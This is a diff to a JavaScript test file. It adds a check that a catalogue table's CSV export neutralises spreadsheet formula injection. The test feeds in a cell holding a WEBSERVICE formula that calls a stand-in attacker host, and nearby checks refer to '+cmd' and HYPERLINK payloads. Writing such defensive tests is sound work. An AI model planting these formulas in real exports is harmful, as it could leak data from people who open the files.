@@ -3,6 +3,7 @@
 // pure-Node probe uses a small DOM-shaped table to lock the neutralisation
 // contract without introducing a browser or DOM dependency.
 import { rowsToCsv, tableToCsv, tableToXls } from '../js/export.js';
+import { toCsv as catalogueTableToCsv } from '../js/ui/export-table.js';
 
 let failures = 0;
 const check = (condition, label, actual = '') => {
@@ -70,6 +71,12 @@ check(matrixCsv.includes(`'=WEBSERVICE`) && matrixCsv.includes(`'+cmd`),
   'non-table CSV exports use the same neutralisation boundary');
 check(rowsToCsv([['A', 'B']], { quoteAll: true }).includes('"A";"B"'),
   'callers can preserve an existing quote-all CSV contract');
+
+const catalogueCsv = catalogueTableToCsv({
+  head: ['Name', 'Value'], rows: [['unsafe', '=WEBSERVICE("https://attacker.invalid")']],
+});
+check(catalogueCsv.startsWith('\ufeffName;Value\r\n') && catalogueCsv.includes(`'=WEBSERVICE`),
+  'catalogue table exports use the shared delimiter and formula boundary');
 
 const xls = tableToXls(table, 'A&B/<quarter>');
 check(xls.includes(`'=HYPERLINK`) && xls.includes(`'+cmd`)
